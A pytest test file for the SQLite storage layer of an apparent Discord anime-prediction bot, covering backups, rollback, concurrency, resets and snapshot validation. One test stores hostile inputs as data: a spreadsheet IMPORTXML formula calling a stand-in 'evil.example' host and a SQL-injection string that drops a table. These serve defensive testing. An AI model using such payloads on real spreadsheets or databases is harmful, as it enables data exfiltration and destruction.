import asyncio
import os
import sqlite3
import threading
import time

import pytest

import storage
from conftest import Env


def run(coro):
    return asyncio.run(coro)


def test_new_database_has_templates_and_reopening_keeps_everything(env):
    assert [t["name"] for t in storage.list_templates()] == ["Standard", "First Week Advantage"]
    storage.seed_default_templates()
    assert len(storage.list_templates()) == 2, "seeding twice must not duplicate"
    storage.set_config("note", "kept")
    assert storage.open_db(env.db_path) is False, "an existing file is not a fresh install"
    assert storage.get_config("note") == "kept" and len(storage.list_templates()) == 2


def test_deleted_default_templates_stay_deleted(env):
    storage._db().execute("DELETE FROM templates")
    storage.seed_default_templates()
    assert storage.list_templates() == []


def test_discord_ids_and_odd_text_are_stored_exactly(env):
    big = 1234567890123456789
    storage.set_config("as_int", big)
    assert storage.get_config("as_int") == str(big)
    storage.upsert_prediction("week-1", big, "u", ["a"] * 10, big + 1)
    p = storage.get_prediction("week-1", str(big))
    assert p["user_id"] == str(big) and p["message_id"] == str(big + 1)
    evil = '=IMPORTXML("http://evil.example","//a")'
    storage.set_ballot_picks("week-1", "1", "u", {"Anime": evil, "Quote": "it's \"fine\"; DROP TABLE weeks;--"})
    assert {p["guess"] for p in storage.get_ballot_picks("week-1", "1")} == {evil, "it's \"fine\"; DROP TABLE weeks;--"}
    assert storage.list_weeks() == [] and storage._db().execute("SELECT COUNT(*) FROM weeks").fetchone()[0] == 0


def test_only_real_changes_count_as_changes_for_the_backup_loop(env):
    storage.add_anime("Some Show")
    storage.mark_backed_up(storage.get_revision())
    assert not storage.is_dirty()
    assert storage.add_anime("some  SHOW") is False        # duplicate: nothing changed
    assert storage.remove_anime("not there") is None
    assert not storage.is_dirty()
    storage.add_anime("Another")
    assert storage.is_dirty()


def test_a_failed_write_rolls_back_completely(env):
    with pytest.raises(sqlite3.IntegrityError):
        storage.create_week("week-1", "standard", "", 2, 1)
        storage.create_week("week-1", "standard", "", 2, 1)        # duplicate id fails halfway
    assert [w["week_id"] for w in storage.list_weeks()] == ["week-1"]
    assert storage.get_rules("week-1") == {p: (2, 1) for p in range(1, 11)}, "rules must not be doubled or lost"
    assert storage.get_current_week_id() == "week-1"


def test_concurrent_writers_from_threads_dont_collide(env):
    async def scenario():
        await asyncio.gather(*(
            storage.aio.upsert_prediction("week-1", str(1000 + n), f"user{n}", [f"t{n}"] * 10, 5000 + n)
            for n in range(40)
        ))
        assert len(storage.list_predictions("week-1")) == 40
        await asyncio.gather(*(storage.aio.add_anime(f"Show {n}") for n in range(40)))
        assert len(storage.get_anime_list()) == 40
    run(scenario())


def test_event_loop_stays_responsive_while_the_database_is_busy(env):
    async def scenario():
        release, holding = threading.Event(), threading.Event()

        def slow_writer():
            with storage._lock:
                holding.set()
                release.wait(2)

        threading.Thread(target=slow_writer, daemon=True).start()
        holding.wait(1)
        worst, stop = 0.0, False

        async def ticker():
            nonlocal worst
            while not stop:
                t = time.perf_counter()
                await asyncio.sleep(0.01)
                worst = max(worst, time.perf_counter() - t - 0.01)

        tick = asyncio.create_task(ticker())
        lookup = asyncio.create_task(storage.aio.get_config("anything"))
        await asyncio.sleep(0.4)
        assert not lookup.done()
        release.set()
        await lookup
        stop = True
        await tick
        assert worst < 0.15, f"event loop stalled for {worst:.2f}s"
    run(scenario())


def test_damaged_database_file_is_set_aside_and_treated_as_fresh(tmp_path):
    path = str(tmp_path / "prediction.db")
    with open(path, "wb") as f:
        f.write(b"this is not a database at all" * 50)
    assert storage.open_db(path) is True
    assert [p.name for p in tmp_path.iterdir() if ".corrupt-" in p.name], "the bad file should be kept for inspection"
    storage.set_config("works", "yes")
    assert storage.get_config("works") == "yes"


def test_reset_clears_the_season_but_keeps_channels_and_templates(env):
    storage.set_config("announcement_channel_id", "123")
    storage.replace_anime_list([f"T{n}" for n in range(12)])
    storage.create_week("week-1", "standard", "", 2, 1)
    storage.upsert_prediction("week-1", "1", "u", ["T0"] * 10, 9)
    storage.save_result("week-1", ["T0"] * 10)
    storage.replace_scores("week-1", [{"user_id": "1", "username": "u", "points": 5, "breakdown": []}])
    storage.create_ballot_event("week-2", "", [("Anime", 10)])
    storage.set_ballot_picks("week-2", "1", "u", {"Anime": "x"})
    storage.upsert_ballot_submission("week-2", "1", "u", 3)
    storage.reset_season()
    assert storage.data_summary() == {"weeks": 0, "submissions": 0, "titles": 0, "scored_rows": 0}
    for table in storage.SEASON_TABLES:
        assert storage._db().execute(f"SELECT COUNT(*) FROM {table}").fetchone()[0] == 0, table
    assert storage.get_config("announcement_channel_id") == "123"
    assert storage.get_current_week() is None and len(storage.list_templates()) == 2
    assert storage.next_week_id() == "week-1"


def test_set_week_points_replaces_all_ten_rows(env):
    storage.create_week("week-1", "standard", "", 2, 1)
    storage.set_week_points("week-1", 7, -1)
    assert storage.get_rules("week-1") == {p: (7, -1) for p in range(1, 11)}
    with pytest.raises(ValueError):
        storage.set_week_points("week-9", 1, 1)


# ---- snapshots ---------------------------------------------------------------------------------------

def _tampered(sql):
    data, _ = storage.snapshot()
    path = os.path.join(os.environ["DATA_DIR"], "tamper.db")
    with open(path, "wb") as f:
        f.write(data)
    conn = sqlite3.connect(path)
    conn.execute(sql)
    conn.commit()
    conn.close()
    with open(path, "rb") as f:
        return f.read()


def test_snapshot_round_trips_through_inspect_and_restore(env):
    storage.replace_anime_list([f"T{n}" for n in range(12)])
    storage.create_week("week-1", "standard", "n", 2, 1)
    data, revision = storage.snapshot()
    assert revision == storage.get_revision()
    info = storage.inspect_snapshot(data)
    assert info["titles"] == 12 and info["weeks"] == 1 and info["snapshot_at"] != "unknown time"

    storage.reset_season()
    assert storage.get_anime_list() == []
    restored = storage.restore_snapshot(data)
    assert restored["titles"] == 12
    assert len(storage.get_anime_list()) == 12 and storage.get_week("week-1")["note"] == "n"
    assert storage.is_dirty(), "a restore must be backed up again as the newest snapshot"


@pytest.mark.parametrize("label, data, needle", [
    ("random bytes", b"hello world" * 100, "not a SQLite"),
    ("empty", b"", "not a SQLite"),
    ("truncated header only", b"SQLite format 3\x00" + b"\x00" * 50, "couldn't be read"),
])
def test_unusable_backups_are_refused(env, label, data, needle):
    with pytest.raises(storage.InvalidBackup) as e:
        storage.inspect_snapshot(data)
    assert needle in str(e.value), (label, str(e.value))


def test_database_from_something_else_or_a_newer_bot_is_refused(env, tmp_path):
    other = tmp_path / "other.db"
    conn = sqlite3.connect(other)
    conn.execute("CREATE TABLE notes(x)")
    conn.commit()
    conn.close()
    with pytest.raises(storage.InvalidBackup, match="missing data"):
        storage.inspect_snapshot(other.read_bytes())
    with pytest.raises(storage.InvalidBackup, match="newer version"):
        storage.inspect_snapshot(_tampered("UPDATE meta SET value = '99' WHERE key = 'schema_version'"))


def test_a_refused_restore_leaves_current_data_untouched(env):
    storage.replace_anime_list([f"T{n}" for n in range(12)])
    with pytest.raises(storage.InvalidBackup):
        storage.restore_snapshot(b"nope")
    assert len(storage.get_anime_list()) == 12
